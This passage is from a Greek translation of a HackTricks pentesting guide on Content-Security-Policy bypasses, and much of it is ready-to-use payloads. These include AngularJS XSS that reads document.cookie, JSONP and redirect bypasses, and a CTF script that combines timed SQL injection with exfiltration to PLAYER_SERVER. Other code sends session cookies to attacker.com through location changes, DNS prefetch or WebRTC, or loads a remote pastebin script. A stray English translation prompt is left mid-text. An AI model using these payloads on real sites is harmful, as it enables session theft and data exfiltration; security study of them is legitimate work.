Καθοδηγώντας αυτόν τον πίνακα στο φίλτρο `orderBy`, είναι δυνατόν να επαναληφθεί, εκμεταλλευόμενος το τερματικό στοιχείο (το αντικείμενο `window`) για να ενεργοποιηθεί μια παγκόσμια συνάρτηση όπως το `alert()`. Το παρακάτω απόσπασμα κώδικα επεξηγεί αυτήν τη διαδικασία:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Αυτό το απόσπασμα υπογραμμίζει τη χρήση της οδηγίας `ng-focus` για να ενεργοποιήσει το συμβάν, χρησιμοποιώντας το `$event.path|orderBy` για να χειριστεί τον πίνακα `path`, και εκμεταλλευόμενο το αντικείμενο `window` για να εκτελέσει τη λειτουργία `alert()`, αποκαλύπτοντας έτσι το `document.cookie`.

**Βρείτε άλλες παρακάμψεις στο Angular** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS και λευκή λίστα τομέων
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
### Παράκαμψη της Πολιτικής Ασφαλείας Περιεχομένου (CSP) 

Μια πολιτική CSP που προσθέτει στη λευκή λίστα τομείς για τη φόρτωση script σε μια εφαρμογή Angular JS μπορεί να παρακαμφθεί μέσω της κλήσης συναρτήσεων επιστροφής και ορισμένων ευάλωτων κλάσεων. Περισσότερες πληροφορίες για αυτήν την τεχνική μπορούν να βρεθούν σε ένα λεπτομερές οδηγό διαθέσιμο σε αυτό το [αποθετήριο git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

Λειτουργικά φορτία:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
### Διέλευση μέσω Ανακατεύθυνσης

Τι συμβαίνει όταν η CSP συναντά μια ανακατεύθυνση στην πλευρά του διακομιστή; Αν η ανακατεύθυνση οδηγεί σε μια διαφορετική προέλευση που δεν επιτρέπεται, τότε θα αποτύχει.

Ωστόσο, σύμφωνα με την περιγραφή στο [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), αν η ανακατεύθυνση οδηγεί σε ένα διαφορετικό μονοπάτι, μπορεί να παρακάμψει τους αρχικούς περιορισμούς.

Εδώ υπάρχει ένα παράδειγμα:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Εάν το CSP είναι ρυθμισμένο σε `https://www.google.com/a/b/c/d`, αφού λαμβάνεται υπόψη το μονοπάτι, τόσο τα σενάρια `/test` όσο και `/a/test` θα αποκλειστούν από το CSP.

Ωστόσο, το τελικό `http://localhost:5555/301` θα **ανακατευθυνθεί στην πλευρά του διακομιστή σε `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Καθώς πρόκειται για ανακατεύθυνση, το **μονοπάτι δεν λαμβάνεται υπόψη**, και το **σενάριο μπορεί να φορτωθεί**, παρακάμπτοντας έτσι τον περιορισμό του μονοπατιού.

Με αυτήν την ανακατεύθυνση, ακόμα κι αν το μονοπάτι καθορίζεται πλήρως, θα παρακαμφθεί.

Συνεπώς, η καλύτερη λύση είναι να διασφαλιστεί ότι η ιστοσελίδα δεν έχει καμία ευπάθεια σε ανοικτές ανακατευθύνσεις και ότι δεν υπάρχουν τομείς που μπορούν να εκμεταλλευτούν στους κανόνες του CSP.

### Παράκαμψη του CSP με κρεμαστό σήμανση

Διαβάστε [εδώ](../dangling-markup-html-scriptless-injection/) πώς.

### 'unsafe-inline'; img-src \*; μέσω XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` σημαίνει ότι μπορείτε να εκτελέσετε οποιοδήποτε script μέσα στον κώδικα (το XSS μπορεί να εκτελέσει κώδικα) και `img-src *` σημαίνει ότι μπορείτε να χρησιμοποιήσετε στην ιστοσελίδα οποιαδήποτε εικόνα από οποιαδήποτε πηγή.

Μπορείτε να παρακάμψετε αυτό το CSP με την εξυπακούοντα εξαγωγή δεδομένων μέσω εικόνων (σε αυτήν την περίπτωση το XSS καταχράται ένα CSRF όπου μια σελίδα προσβάσιμη από το bot περιέχει ένα SQLi, και εξάγει τη σημαία μέσω μιας εικόνας):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Μπορείτε επίσης να καταχραστείτε αυτή τη διαμόρφωση για **φόρτωση κώδικα JavaScript που έχει εισαχθεί μέσα σε μια εικόνα**. Για παράδειγμα, αν η σελίδα επιτρέπει τη φόρτωση εικόνων από το Twitter. Μπορείτε να **κατασκευάσετε** μια **ειδική εικόνα**, να την **ανεβάσετε** στο Twitter και να καταχραστείτε το "**unsafe-inline**" για να **εκτελέσετε** έναν κώδικα JS (όπως ένα κανονικό XSS) που θα **φορτώσει** την **εικόνα**, θα **εξάγει** τον **JS** από αυτήν και θα τον **εκτελέσει**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Με Εργαζόμενους Υπηρεσιών

Η λειτουργία **`importScripts`** των εργαζομένων υπηρεσιών δεν περιορίζεται από το CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Έγχυση Πολιτικής

**Έρευνα:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Αν ένα **παράμετρος** που στέλνετε από εσάς είναι **επικολλημένος μέσα** στη **δήλωση** της **πολιτικής**, τότε μπορείτε να **τροποποιήσετε** τη **πολιτική** με τρόπο που την καθιστά **άχρηστη**. Μπορείτε να **επιτρέψετε το script 'unsafe-inline'** με οποιαδήποτε από αυτές τις παρακάμψεις:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Διότι αυτή η οδηγία θα **αντικαταστήσει υπάρχουσες οδηγίες script-src**.\
Μπορείτε να βρείτε ένα παράδειγμα εδώ: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Στο Edge είναι πολύ απλό. Αν μπορείτε να προσθέσετε στο CSP μόνο αυτό: **`;_`** το **Edge** θα **απορρίψει** ολόκληρη τη **πολιτική**.\
Παράδειγμα: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; μέσω XSS (iframe) - Χρονισμένη επίθεση

Παρατηρήστε την απουσία της οδηγίας `'unsafe-inline'`\
Αυτή τη φορά μπορείτε να κάνετε το θύμα **να φορτώσει** μια σελίδα υπό **τον έλεγχό σας** μέσω **XSS** με ένα `<iframe>`. Αυτή τη φορά θα κάνετε το θύμα να έχει πρόσβαση στη σελίδα από όπου θέλετε να εξάγετε πληροφορίες (**CSRF**). Δεν μπορείτε να έχετε πρόσβαση στο περιεχόμενο της σελίδας, αλλά αν με κάποιον τρόπο μπορείτε να **ελέγξετε τον χρόνο που χρειάζεται η σελίδα για να φορτωθεί** μπορείτε να εξάγετε τις πληροφορίες που χρειάζεστε.

Αυτή τη φορά θα εξαχθεί ένας **σημαία**, κάθε φορά που μια **χαρακτήρας μαντεύεται σωστά** μέσω SQLi η **απόκριση** παίρνει **περισσότερο χρόνο** λόγω της συνάρτησης ύπνου. Τότε, θα μπορείτε να εξάγετε τη σημαία:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Μέσω των Bookmarklets

Αυτή η επίθεση θα περιλάμβανε κάποια κοινωνική μηχανική όπου ο επιτιθέμενος **πείθει τον χρήστη να σύρει και να αφήσει ένα σύνδεσμο πάνω στο bookmarklet του προγράμματος περιήγησης**. Αυτό το bookmarklet θα περιείχε **κακόβουλο κώδικα javascript** που όταν σύρθηκε και αφέθηκε ή κάνοντας κλικ θα εκτελούνταν στο πλαίσιο του τρέχοντος παραθύρου ιστοσελίδας, **παρακάμπτοντας το CSP και επιτρέποντας την κλοπή ευαίσθητων πληροφοριών** όπως cookies ή τεκμήρια.

Για περισσότερες πληροφορίες [**ελέγξτε την αρχική αναφορά εδώ**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Παράκαμψη CSP περιορίζοντας το CSP

Σε [**αυτήν την ανάλυση CTF**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), το CSP παρακάμπτεται με το να ενθάρρυνεται μέσα σε ένα επιτρεπόμενο iframe ένα πιο περιοριστικό CSP που απαγόρευε τη φόρτωση ενός συγκεκριμένου αρχείου JS που, στη συνέχεια, μέσω **μόλυνσης πρωτοτύπου** ή **καταστροφής dom** επέτρεψε να **καταχραστεί ένα διαφορετικό script για τη φόρτωση ενός αυθαίρετου script**.

Μπορείτε να **περιορίσετε ένα CSP ενός Iframe** με το χαρακτηριστικό **`csp`**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

Στο [**αυτό το CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), ήταν δυνατό μέσω **ενσωμάτωσης HTML** να **περιοριστεί** περισσότερο ένα **CSP** έτσι ώστε ένα script που αποτρέπει το CSTI να απενεργοποιηθεί και επομένως η **ευπάθεια να γίνει εκμεταλλεύσιμη.**\
Το CSP μπορεί να γίνει πιο περιοριστικό χρησιμοποιώντας **ετικέτες μεταδεδομένων HTML** και τα inline scripts μπορούν να απενεργοποιηθούν **αφαιρώντας** τη **καταχώριση** που επιτρέπει το **nonce** τους και **ενεργοποιώντας συγκεκριμένο inline script μέσω sha**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### JS διαρροή με Content-Security-Policy-Report-Only

Αν μπορείτε να καταφέρετε να κάνετε τον διακομιστή να ανταποκριθεί με την κεφαλίδα **`Content-Security-Policy-Report-Only`** με μια **τιμή που ελέγχετε εσείς** (ίσως λόγω ενός CRLF), θα μπορούσατε να τον κατευθύνετε προς τον δικό σας διακομιστή και αν **τυλίξετε** το **περιεχόμενο JS** που θέλετε να διαρρεύσετε με **`<script>`** και επειδή είναι πολύ πιθανό να μην επιτρέπεται το `unsafe-inline` από το CSP, αυτό θα **ενεργοποιήσει ένα σφάλμα CSP** και ένα μέρος του script (που περιέχει τις ευαίσθητες πληροφορίες) θα σταλεί στον διακομιστή από το `Content-Security-Policy-Report-Only`.

Για ένα παράδειγμα [**ελέγξτε αυτό το CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Διαρροή Πληροφοριών με CSP και Iframe

* Δημιουργείται ένα `iframe` που δείχνει σε ένα URL (ας το ονομάσουμε `https://example.redirect.com`) το οποίο επιτρέπεται από το CSP.
* Αυτό το URL στη συνέχεια ανακατευθύνει σε ένα μυστικό URL (π.χ., `https://usersecret.example2.com`) το οποίο **δεν επιτρέπεται** από το CSP.
* Ακούγοντας το γεγονός `securitypolicyviolation`, μπορεί κανείς να αιχμαλωτίσει την ιδιότητα `blockedURI`. Αυτή η ιδιότητα αποκαλύπτει τον τομέα του μπλοκαρισμένου URI, διαρρέοντας τον μυστικό τομέα στον οποίο ανακατευθύνθηκε το αρχικό URL.

Είναι ενδιαφέρον να σημειωθεί ότι οι περιηγητές όπως το Chrome και το Firefox έχουν διαφορετική συμπεριφορά στην χειρισμό των iframes όσον αφορά το CSP, οδηγώντας σε πιθανή διαρροή ευαίσθητων πληροφοριών λόγω μη ορισμένης συμπεριφοράς.

Μια άλλη τεχνική περιλαμβάνει την εκμετάλλευση του ίδιου του CSP για να συμπεράνει το μυστικό υποτομέα. Αυτή η μέθοδος βασίζεται σε έναν αλγόριθμο δυαδικής αναζήτησης και στην προσαρμογή του CSP για να περιλαμβάνει συγκεκριμένους τομείς που είναι εσκεμμένα μπλοκαρισμένοι. Για παράδειγμα, αν ο μυστικός υποτομέας αποτελείται από άγνωστους χαρακτήρες, μπορείτε να δοκιμάσετε επαναληπτικά διαφορετικούς υποτομείς τροποποιώντας την κατευθυντήρια γραμμή του CSP για να μπλοκάρει ή να επιτρέπει αυτούς τους υποτομείς. Εδώ υπάρχει ένα απόσπασμα που δείχνει πώς μπορεί να ρυθμιστεί το CSP για να διευκολύνει αυτήν τη μέθοδο:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Παρακολουθώντας ποια αιτήματα αποκλείονται ή επιτρέπονται από το CSP, κάποιος μπορεί να περιορίσει τους πιθανούς χαρακτήρες στο μυστικό subdomain, αποκαλύπτοντας τελικά τον πλήρη URL.

Και οι δύο μέθοδοι εκμεταλλεύονται τις λεπτομέρειες της υλοποίησης και τη συμπεριφορά του CSP στους browsers, δείχνοντας πώς πολιτικές που φαίνεται να είναι ασφαλείς μπορούν αθέλητα να διαρρεύσουν ευαίσθητες πληροφορίες.

Κόλπο από [**εδώ**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) διακομιστή για επικοινωνία με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγές Χάκερ**\
Ασχοληθείτε με περιεχόμενο που εξερευνά την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκερ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορο κόσμο του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανακοινώσεις για νέα ευρήματα ασφαλείας και σημαντικές ενημερώσεις πλατφόρμας

**Συμμετέχετε μαζί μας** στο [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε τη συνεργασία με κορυφαίους χάκερ σήμερα!

## Μη Ασφαλείς Τεχνολογίες για Παράκαμψη του CSP

### Σφάλματα PHP όταν υπάρχουν πολλές παράμετροι

Σύμφωνα με την [**τελευταία τεχνική που σχολιάζεται σε αυτό το βίντεο**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), αποστέλλοντας πολλές παραμέτρους (1001 παράμετροι GET αν και μπορείτε επίσης να το κάνετε με παραμέτρους POST και περισσότερα από 20 αρχεία). Οποιαδήποτε ορισμένη **`header()`** στον κώδικα PHP της ιστοσελίδας **δεν θα αποσταλεί** λόγω του σφάλματος που αυτό θα προκαλέσει.

### Υπερφόρτωση buffer απάντησης PHP

Το PHP είναι γνωστό για το **buffering της απάντησης σε 4096** bytes από προεπιλογή. Επομένως, αν το PHP εμφανίζει προειδοποίηση, παρέχοντας **αρκετά δεδομένα μέσα στις προειδοποιήσεις**, η **απάντηση** θα αποσταλεί **πριν από** το **κεφαλίδιο CSP**, προκαλώντας την αγνόηση του κεφαλιδίου.\
Στη συνέχεια, η τεχνική αποτελείται βασικά στο **γέμισμα του buffer απάντησης με προειδοποιήσεις** ώστε το κεφαλίδιο CSP να μην αποσταλεί.

Ιδέα από [**αυτό το writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Αναδιατύπωση Σελίδας Σφάλματος

Από [**αυτό το writeup**](https://blog.ssrf.kr/69) φαίνεται ότι ήταν δυνατό να παρακάμψει κάποιος μια προστασία CSP φορτώνοντας μια σελίδα σφάλματος (πιθανότατα χωρίς CSP) και αναδιατυπώνοντας το περιεχόμενό της.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

Το SOME είναι μια τεχνική που καταχράζεται ένα XSS (ή πολύ περιορισμένο XSS) **σε ένα τέλος μιας σελίδας** για να **καταχραστεί** **άλλα τέλη της ίδιας προέλευσης.** Αυτό επιτυγχάνεται φορτώνοντας το ευάλωτο τέλος από μια σελίδα επιτιθέμενου και στη συνέχεια ανανεώνοντας τη σελίδα επιτιθέμενου στο πραγματικό τέλος στην ίδια προέλευση που θέλετε να καταχραστείτε. Με αυτόν τον τρόπο το **ευάλωτο τέλος** μπορεί να χρησιμοποιήσει το αντικείμενο **`opener`** στο **φορτίο** για να **έχει πρόσβαση στο DOM** του **πραγματικού τέλους προς κατάχρηση**. Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Επιπλέον, το **wordpress** έχει ένα τέλος **JSONP** στο `/wp-json/wp/v2/users/1?_jsonp=data` που θα **αντανακλά** τα **δεδομένα** που στάλθηκαν στην έξοδο (με τον περιορισμό μόνο γραμμάτων, αριθμών και τελείες).

Ένας επιτιθέμενος μπορεί να καταχραστεί αυτό το τέλος για να **προκαλέσει μια επίθεση SOME** κατά του WordPress και να την **ενσωματώσει** μέσα σε `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` σημειώστε ότι αυτό το **script** θα **φορτωθεί** επειδή είναι **επιτρεπόμενο από το 'self'**. Επιπλέον, και επειδή το WordPress είναι εγκατεστημένο, ένας επιτιθέμενος μπορεί να καταχραστεί την **επίθεση SOME** μέσω του **ευάλωτου τέλους κλήσης** που **παρακάμπτει το CSP** για να δώσει περισσότερα προνόμια σε ένα χρήστη, να εγκαταστήσει ένα νέο πρόσθετο...\
Για περισσότερες πληροφορίες σχετικά με το πώς να εκτελέσετε αυτήν την επίθεση ελέγξτε [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Παρακάμψεις Παρακολούθησης Περιεχομένου (CSP Exfiltration Bypasses)

Αν υπάρχει ένα αυστηρό CSP που δεν σάς επιτρέπει να **αλληλεπιδράτε με εξωτερικούς διακομιστές**, υπάρχουν μερικά πράγματα που μπορείτε πάντα να κάνετε για να εξαγάγετε τις πληροφορίες.

### Τοποθεσία

Μπορείτε απλά να ενημερώσετε την τοποθεσία για να στείλετε στον διακινητή τις μυστικές πληροφορίες:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Ετικέτα Meta

Μπορείτε να κατευθύνετε με την ενσωμάτωση μιας ετικέτας meta (αυτό είναι απλά μια κατεύθυνση, δεν θα διαρρεύσει περιεχόμενο)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Για να φορτώνουν οι σελίδες πιο γρήγορα, οι περιηγητές πρόκειται να προ-αναλύουν τα ονόματα των κεντρικών υπολογιστών σε διευθύνσεις IP και να τα αποθηκεύουν στη μνήμη cache για μετέπειτα χρήση.\
Μπορείτε να υποδείξετε σε έναν περιηγητή να προ-αναλύσει ένα όνομα κεντρικού υπολογιστή με: `<link rel="dns-prefetch" href="something.com">`

Μπορείτε να εκμεταλλευτείτε αυτήν τη συμπεριφορά για **εξαγωγή ευαίσθητων πληροφοριών μέσω αιτημάτων DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
### Άλλος τρόπος:

The following is content from a hacking book about hacking techiques. The following content is from the file pentesting-web/content-security-policy-csp-bypass/README.md. Translate the relevant English text to Greek and return the translation keeping excatly the same markdown and html syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, and markdown tags. Also don't add any extra stuff apart from the translation and markdown syntax.
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Για να αποφευχθεί αυτό, ο διακομιστής μπορεί να στείλει την κεφαλίδα HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Φαίνεται ότι αυτή η τεχνική δεν λειτουργεί σε headless browsers (bots)
{% endhint %}

### WebRTC

Σε πολλές σελίδες μπορείτε να διαβάσετε ότι **το WebRTC δεν ελέγχει την πολιτική `connect-src`** του CSP.

Πράγματι, μπορείτε να _διαρρεύσετε_ πληροφορίες χρησιμοποιώντας ένα _αίτημα DNS_. Ελέγξτε αυτόν τον κώδικα:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Άλλη επιλογή:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Έλεγχος Πολιτικών CSP Online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Αυτόματη δημιουργία CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Αναφορές

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

​

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) διακομιστή για επικοινωνία με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά την αγωνία και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενήμεροι με τον γρήγορο κόσμο του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενήμεροι με τις νεότερες ανακοινώσεις για νέες αμοιβές ευρημάτων και σημαντικές ενημερώσεις πλατφόρμας

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) και αρχίστε να συνεργάζεστε με κορυφαίους χάκερ σήμερα!

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε** 💬 στην ομάδα [**Discord**](https://discord.gg/hRep4RUj7f) ή στην ομάδα [**telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
